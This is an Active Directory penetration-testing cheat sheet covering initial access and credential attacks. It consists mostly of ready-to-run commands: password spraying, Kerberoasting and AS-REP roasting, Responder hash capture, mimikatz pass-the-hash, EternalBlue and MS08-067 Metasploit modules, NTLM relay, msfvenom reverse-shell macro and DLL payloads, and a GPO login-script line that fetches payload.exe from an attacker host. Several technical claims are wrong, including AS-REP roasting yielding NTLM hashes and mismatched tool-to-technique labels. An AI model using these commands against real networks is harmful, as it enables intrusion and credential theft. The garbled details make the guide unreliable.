# **Active Directory Pentesting: Initial Access & Credential Attacks**

## **Scenario:**
This document outlines **initial access techniques for Active Directory (AD) penetration testing**, focusing on **credential attacks, exploitation of AD vulnerabilities, and social engineering techniques**. The goal is to **obtain valid user credentials or execute remote code** as an entry point for further privilege escalation.

### **References for Further Study:**
- **MITRE ATT&CK – Initial Access & Credential Access Techniques (T1078, T1110, T1557, T1556)**
- **BloodHound Red Teaming Guide**
- **Active Directory Credential Attacks (Pass-the-Hash, Kerberoasting, AS-REP Roasting)**
- **Windows Privilege Escalation Techniques (Mimikatz, LLMNR Poisoning, NTLM Relaying)**

---

# **🛠 Step 3: Initial Access & Credential Attacks**
**Objective:** Obtain **valid user credentials** or execute **remote code** as an initial foothold.

## **3.1 Credential Attacks**

### **Password Spraying on SMB, LDAP, WinRM, RDP, Kerberos**
- **Why?** Many AD users reuse weak passwords, and password spraying avoids account lockouts.
- **Techniques:**
  - **SMB Password Spraying (CME)**:
    - `crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success`
  - **WinRM Brute Force:**
    - `kerbrute passwordspray -d <domain> --dc <DC_IP> -U users.txt -P passwords.txt`
  - **Kerberos Password Spraying (No Lockout):**
    - `kerbrute -domain <domain> -users users.txt -passwords passwords.txt`
- **Alternative Methods:**
  - **Brute force with Hydra:**
    - `hydra -L users.txt -P passwords.txt smb://<target>`
  - **Automated tools:** `Spray365`, `CredCrack`, `Medusa`

### **AS-REP Roasting for Hash Extraction**
- **Why?** If a user has **Kerberos Pre-Authentication disabled**, an attacker can extract an **encrypted NTLM hash**.
- **Techniques:**
  - **Identify vulnerable accounts:**
    - `GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat`
  - **Extract AS-REP hashes:**
    - `crackmapexec ldap <DC_IP> -u '' -p '' --asreproast`
- **Alternative Methods:**
  - **Automated Kerberos enumeration via BloodHound**
  - **Use Impacket's `GetUserSPNs.py` for AS-REP roasting**

### **Kerberoasting (Extracting Service Account Hashes)**
- **Why?** Service accounts often have weak passwords that can be cracked offline.
- **Techniques:**
  - **Request SPN tickets for Kerberoasting:**
    - `GetUserSPNs.py -request -dc-ip <DC_IP> <domain>/user:password`
  - **Extract service account tickets:**
    - `Invoke-Kerberoast | Format-Table -AutoSize`
- **Alternative Methods:**
  - **Analyze BloodHound SPN relationships to prioritize accounts**
  - **Use Rubeus for targeted Kerberoasting**

### **Enumerate and Crack NTLM Hashes (Responder, MITM Attacks)**
- **Why?** NTLM hashes can be captured via **LLMNR/NBT-NS Poisoning**.
- **Techniques:**
  - **Intercept and capture NTLM hashes:**
    - `responder -I eth0 -wv`
  - **Crack NTLM hashes with hashcat:**
    - `hashcat -m 5600 captured.ntlm rockyou.txt`
- **Alternative Methods:**
  - **Poison WPAD requests for NTLM relay attacks**
  - **Use MITM6 for IPv6-based NTLM hash capture**

### **Pass-the-Hash (PTH) and Over-Pass-the-Hash (Pass-the-Ticket)**
- **Why?** Once NTLM hashes are obtained, they can be used to authenticate without cracking.
- **Techniques:**
  - **Authenticate using Pass-the-Hash:**
    - `pth-winexe -U <domain>/Administrator%NTLMhash //<target>/cmd.exe`
  - **Use Mimikatz for Over-Pass-the-Hash:**
    - `mimikatz "privilege::debug" "sekurlsa::pth /user:user /domain:domain /ntlm:hash" exit`
- **Alternative Methods:**
  - **Use CrackMapExec to relay NTLM authentication**
  - **Extract hashes from LSASS using ProcDump**

---

## **3.2 Exploiting AD Vulnerabilities for Initial Access**

### **Zero-Day & N-Day Exploits Against AD Components (MS08-067, MS17-010)**
- **Why?** Unpatched systems remain vulnerable to legacy exploits.
- **Techniques:**
  - **Exploit EternalBlue (MS17-010):**
    - `use exploit/windows/smb/ms17_010_eternalblue`
  - **Trigger MS08-067 (NetAPI Exploit):**
    - `use exploit/windows/smb/ms08_067_netapi`

### **NTLM Relay Attacks (SMB Signing Disabled, ADIDNS, Exchange Relaying)**
- **Why?** If SMB signing is disabled, attackers can relay NTLM authentication.
- **Techniques:**
  - **Enumerate SMB signing status:**
    - `nmap --script smb2-security-mode -p445 <target>`
  - **Launch NTLM relay attack with Impacket:**
    - `ntlmrelayx.py -tf targets.txt -smb2support`

### **PrinterBug Exploitation for NTLM Hash Capture**
- **Why?** Printer Spooler service can be exploited to relay NTLM authentication.
- **Techniques:**
  - **Trigger PrinterBug attack:**
    - `spoolSample.exe -d <DC_IP>`

---

## **3.3 Phishing & Social Engineering (Targeted Attacks)**

### **Spear Phishing for Credential Harvesting (Office Macros, HTA Payloads)**
- **Why?** Users often execute malicious Office macros or open HTA files.
- **Techniques:**
  - **Generate malicious macro payload:**
    - `msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f vba`
  - **Use Phishery for capturing Office credentials:**
    - `phishery -d <domain> -u https://malicious.com`

### **Malicious DLL Injection in Network Shares**
- **Why?** Users often execute binaries from network shares.
- **Techniques:**
  - **Inject malicious DLL into writable share:**
    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > payload.dll`
  - **Wait for execution or trigger via PowerShell:**
    - `rundll32.exe \server\share\payload.dll,EntryPoint`

### **Embedding Payloads in GPO Deployed Scripts**
- **Why?** AD admins often use GPOs to deploy login scripts.
- **Techniques:**
  - **Modify existing GPO script:**
    - `echo 'powershell -c Invoke-WebRequest -Uri http://attacker/payload.exe -OutFile C:\temp\payload.exe' >> login.bat`
